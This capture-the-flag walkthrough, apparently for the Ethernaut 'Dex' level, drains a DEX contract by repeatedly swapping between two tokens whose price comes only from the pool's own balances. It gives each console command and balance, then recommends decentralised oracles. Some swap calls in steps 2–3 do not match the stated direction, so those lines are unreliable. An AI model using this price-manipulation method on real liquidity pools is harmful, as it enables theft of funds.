# Dex
The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

## Quick note
Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.

Things that might help:

- How is the price of the token calculated?
- How does the swap method work?
- How do you approve a transaction of an ERC20?

## Analysis

The swapping price calculated based on the token amount of the contract.

```javascript
function get_swap_price(address from, address to, uint amount) public view returns(uint) {
  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```
Since the price relies on the token amount of the contract, we could swap reversibly until either token1 or token2 has 0 amount.

```javascript
token1 = await contract.token1()
'0xAf1B66871843888607821a6e9Da0c2c8bfA661fA'
token2 = await contract.token2()
'0xFb585e5aCE88bE07874d933e282AA8E03E564967'
```

1. Initial balance:
Player's balance: 10 token1, 10 token2

```javascript
await contract.balanceOf(token2, player).then(x=>x.toNumber())
> 10
await contract.balanceOf(token1, player).then(x=>x.toNumber())
> 10
```

Contract's balance: 100 token1, 100 token2
```javascript
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 100
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 100
```
The received amount if swap 10 token1 to token2:
(10 * 100) / 100 = 10 token2

```javascript
await contract.get_swap_price(await token1,token2, 10).then(x=>x.toNumber())
> 10
```

* line 21, it try to transferFrom without approve spender.So, we have to approve first.

```javascript
await contract.approve(contract.address,10);
await contract.swap(token1, token2, 10);
```

-------------------------------------------------
2. Player's balance (swap 10 token1 to token2) : 0 token1, 20 token2
```javascript
await contract.balanceOf(token1, player).then(x=>x.toNumber())
> 0
await contract.balanceOf(token2, player).then(x=>x.toNumber())
> 20
```  
Contract's balance: 110 token1, 90 token2

```javascript
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 110
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 90
```
Received amount if swap 20 token2 to token1:
(20 * 110) / 90 = 24.444 ~ 24 token1 (round down)

```javascript
await contract.get_swap_price(await token2,token1, 20).then(x=>x.toNumber())
> 24
```

Swap
```javascript
await contract.approve(contract.address,20);
await contract.swap(token1, token2, 20);
```
---------------------------------------------------
3. Player's balance (swap 20 token1 to token2) : 24 token1, 0 token2
```javascript
await contract.balanceOf(token1, player).then(x=>x.toNumber())
> 24
await contract.balanceOf(token2, player).then(x=>x.toNumber())
> 0
```  
Contract's balance: 86 token1, 110 token2
```javascript
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 86
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 110
```
Received amount if swap 24 token1 to token2:
(24 * 110) / 86 = 30.69 ~ 30 token2 (round down)

```javascript
await contract.get_swap_price(await token1,token2, 24).then(x=>x.toNumber())
> 30
```

Swap
```javascript
await contract.approve(contract.address,24);
await contract.swap(token1, token2, 24);
```

---------------------------------------------------
4. Player's balance (swap 24 token1 to token2) : 0 token1, 30 token2
```javascript
await contract.balanceOf(token1, player).then(x=>x.toNumber())
> 0
await contract.balanceOf(token2, player).then(x=>x.toNumber())
> 30
```  
Contract's balance: 110 token1, 80 token2
```javascript
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 110
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 80
```

Swap
```javascript
await contract.approve(contract.address,30);
await contract.swap(token2, token1, 30);
```
---------------------------------------------------
5. Player's balance (swap 30 token2 to token1) : 41 token1, 0 token2
```javascript
await contract.balanceOf(token1, player).then(x=>x.toNumber())
> 41
await contract.balanceOf(token2, player).then(x=>x.toNumber())
> 0
```
Contract's balance: 69 token1, 110 token2
```javascript
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 69
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 110
```
Swap
```javascript
await contract.approve(contract.address,41);
await contract.swap(token1, token2, 41);
```
---------------------------------------------------
6. Player's balance (swap 41 token1 to token2) : 0 token1, 65 token2
```javascript
await contract.balanceOf(token1, player).then(x=>x.toNumber())
> 0
await contract.balanceOf(token2, player).then(x=>x.toNumber())
> 65
```
Contract's balance: 110 token1, 45 token2
```javascript
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 110
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 45
```
Swap (Now amout of token2 player > token2 in contract, we can just swap 45 to drain token from contract)
```javascript
await contract.approve(contract.address,45);
await contract.swap(token2, token1, 45);
```
---------------------------------------------------
Final check balance player
```javascript
await contract.balanceOf(token1, player).then(x=>x.toNumber())
> 110
await contract.balanceOf(token2, player).then(x=>x.toNumber())
> 20
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 0
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 90
```
Level completed!
Difficulty 3/10

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need oracles. Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.

Chainlink Data Feeds are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer secure randomness, ability to make any API call, modular oracle network creation, upkeep, actions, and maintainance, and unlimited customization.

Uniswap TWAP Oracles relies on a time weighted price model called TWAP. While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

Here is an example of getting data from a Chainlink data feed (on the kovan testnet):

```javascript
pragma solidity ^0.6.7;

import "@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Kovan
     * Aggregator: ETH/USD
     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331
     */
    constructor() public {
        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);
    }

    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            uint80 roundID, 
            int price,
            uint startedAt,
            uint timeStamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        return price;
    }
}
```
[Try it on remix](https://remix.ethereum.org/#version=soljson-v0.6.7+commit.b8d736ae.js&optimize=false&evmVersion=null&gist=0c5928a00094810d2ba01fd8d1083581&runs=200)